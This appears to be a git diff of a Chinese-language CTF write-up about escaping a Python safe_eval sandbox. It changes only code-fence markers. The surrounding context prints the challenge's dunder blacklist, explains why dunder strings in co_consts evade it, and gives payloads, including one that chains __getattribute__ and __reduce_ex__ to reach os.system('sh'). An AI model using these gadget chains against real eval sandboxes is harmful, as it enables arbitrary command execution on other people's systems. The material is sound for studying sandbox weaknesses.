@@ -11,7 +11,7 @@ TL;DR;
 2. 找到 setattr
 3. 將 descriptor 加上 `__set__` 屬性，結束！
 
-```python!
+```python
 class Desc:
     """
     Welcome to my 🐍 ⛓️
@@ -75,7 +75,7 @@ print(f"🚩: {test.desc}")
 
 那接下來的問題就回到我們該如何往類別上加入屬性呢，我們有一次的 safe_eval 控制機會，並且可以發現他將 `Desc` 也放進 context 了，沒錯，我們要在 `Desc` 中找 gadget。
 
-```python!
+```python
 from types import CodeType
 
 _UNSAFE_ATTRIBUTES = [
@@ -118,7 +118,7 @@ def safe_eval(expr, globals_dict, locals_dict):
 
 可以看到在這個 `safe_eval.py` 中會遞迴的在 `code object` 中看 `co_names` 是否有存在 `__`，也就是說我們不能直接用 dunder method。
 
-```python!
+```python
 class Desc:
     """
     Welcome to my 🐍 ⛓️
@@ -139,7 +139,7 @@ class Desc:
 回來看到 `Desc` 當中有定義了 `desc_helper` ，裡面有 getattr 可以使用，由於我們的目的是拿到 setattr 之類的東西，在 `type` 中找一下就會發現我們可以使用 `type.__setattr__`！
 
 於是我們最終的 payload 就長這樣:
-```python!
+```python
 payload = """
 desctmp := Desc()
 desctmp.desc_helper("__setattr__")
@@ -154,7 +154,7 @@ print(payload)
 這樣不會被 safe_eval 擋下來的原因是 `a['__getattribute__']`  這種操作的 dunder strings 是在 `co_consts` 不是在 `co_name`，有了 getattr 後就能直接 getshell 了，不用管 descriptor 的性質。
 
 maple 的 payload:
-```python!
+```python
 (d:=Desc(),d.desc_helper('__dict__'),ga:=d.helper['__getattribute__'],d.desc_helper('__base__'),object:=d.helper,gao:=ga(object,'__getattribute__'),newobj:=gao([],'__reduce_ex__')(3)[0]),gao(newobj,'__builtins__')['__import__']('os').system('sh')
 ```
  
